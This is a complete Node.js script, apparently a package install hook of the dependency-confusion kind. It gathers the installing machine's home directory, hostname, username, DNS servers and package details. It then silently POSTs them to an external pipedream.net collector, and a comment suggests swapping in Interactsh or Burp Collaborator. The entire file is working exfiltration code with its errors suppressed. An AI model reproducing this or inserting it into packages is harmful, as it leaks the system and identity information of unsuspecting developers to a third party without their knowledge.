const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    packagename: package,
    dirname: __dirname,
    homedirectory: os.homedir(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    version: packageJSON.version,

});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "eoqu05c9wd0uxgg.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();